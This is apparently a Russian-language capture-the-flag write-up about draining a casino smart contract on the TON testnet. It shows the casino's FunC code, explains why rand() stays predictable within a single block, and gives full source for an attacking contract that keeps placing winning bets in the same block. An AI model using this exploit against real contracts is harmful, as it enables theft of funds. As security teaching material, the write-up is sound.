# 4-day
- Дали [контракт](https://testnet.tonviewer.com/kQAgZ_lRPOWLs2aoWtsHAZWFFIZreZc9ItJ8A6vMr491_UZX), который запущен по адресу `kQAgZ_lRPOWLs2aoWtsHAZWFFIZreZc9ItJ8A6vMr491_UZX`
- Известен исходный код контракта

```jsx
#include "imports/stdlib.fc";

const gas_cost = 10000000;

() send(slice addr, slice body, int grams) impure inline_ref {
  ;; int_msg_info$0 ihr_disabled:Bool bounce:Bool bounced:Bool src:MsgAddress -> 011000
  var msg = begin_cell()
    .store_uint(0x18, 6)
    .store_slice(addr)
    .store_coins(grams)
    .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1 + 32)
    .store_slice(body);
  send_raw_message(msg.end_cell(), SEND_MODE_REGULAR);
}

() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
    slice msg = in_msg_full.begin_parse();
    int flags = msg~load_uint(4);
    slice source_address = msg~load_msg_addr();
    if (flags & 1) {
        return ();
    }
    if (rand(10) < 4) {
        if (msg_value * 2 < my_balance - gas_cost) {
            send(source_address, "you won", msg_value * 2);
        } else {
            send(source_address, "vault is empty", my_balance - gas_cost);
        }
        return ();
    }
}

```

Это казино, на нём 100 тонов и надо их всех выкачать

# Решение

Таск основывается на том, что ещё в первый день Вова вкинул, что он знает как взломать контракт Тимура и после этого Тимур дописал `randomize_lt()`

Сама по себе`rand(n)` является небезопасной функцией и работает следующим образом:

- `seed` в контракте определяется `hash(block_seed, account_address)`
- `block_seed` текущего блока знают только валидаторы, а мы этот сид никак узнать не можем

> [Therefore, to predict the result of the random() function in a smart contract, you just need to know the current seed of the block, which isn't possible if you're not a validator.](https://docs.ton.org/v3/guidelines/smart-contracts/security/random-number-generation#how-can-someone-predict-a-random-number)

Тем не менее, можно провести атаку на рандом в пределах одного блока

## Как работает атака?

1. Отправляем первую ставку в казино
2. Если выиграли (получили сообщение `You won`) → продолжаем спамить такие же ставки в тот же блок
3. Если не получили ответа → блок сменился, мы проиграли, останавливаем атаку.
4. Повторяем процесс на новом блоке, пока не обанкротим казино.

Когда казино обанкротилось, выводим деньги из атаковавшего контракта себе на основной аккаунт

## Почему это работает?

`seed` фиксирован в рамках одного блока и если одна ставка выйграла, то и всё ставки в текущем блоке выйграют

## Код атакующего контракта

Может быть не идеальным, но он работает

```jsx
#include "imports/stdlib.fc";

const admin_address = "0QCpmGaG1ypBqdY757UNTZphiXJOMu0bGPxumvjYTu4KEhDj"a;
const vova = "kQAgZ_lRPOWLs2aoWtsHAZWFFIZreZc9ItJ8A6vMr491_UZX"a;

() send_real_bet(slice addr, slice body, int grams) impure inline_ref {
  var msg = begin_cell()
    .store_uint(0x18, 6)
    .store_slice(addr)
    .store_coins(grams)
    .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1 + 32)
    .store_slice(body);
  send_raw_message(msg.end_cell(), SEND_MODE_REGULAR);
}

() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
    if (in_msg_body.slice_empty?()) {
        return ();
    }

    int op = in_msg_body~load_uint(32);

    slice cs = in_msg_full.begin_parse();
    int flags = cs~load_uint(4);
    if (flags & 1) {
        return ();
    }
    slice source_address = cs~load_msg_addr();
    
    if (op == 0) {
        send_real_bet(vova, "auto try", 133700000);
    }
    if (op == 1) {
        send_real_bet(vova, "init try", 100000000);
    }
    ;; ручка для вывода денег
    if (op == 2) {
        if (equal_slices_bits(admin_address, source_address)) { 
            cell msg =  begin_cell()
                .store_uint(0x18, 6)
                .store_slice(source_address)
                .store_coins(0) 
                .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
                .store_uint(0, 32)
                .store_slice("money back")
            .end_cell();
            send_raw_message(msg, 128);
            return ();
        }
    }

    return ();
}
```

# Схема атаки (упрощённая)

В реальности будет в районе 500 транзакций в одной

![[scheme_attack.png]]
Узел A - мой основной аккаунт, который принудительно запускает всё с сообщением `init try`

Узел B - атакующий контракт, который понял, что в этом блоке у нас подходящий `seed`, поэтому начинаем атаковать отсылая сообщения `auto try`

Узел C - казино, принимает ставки и возвращает сообщения `you won` с выигрышем

Атака прекратится после первой неудачи, когда узел C не вернёт никакого ответа

--------
@Jl4cTuk
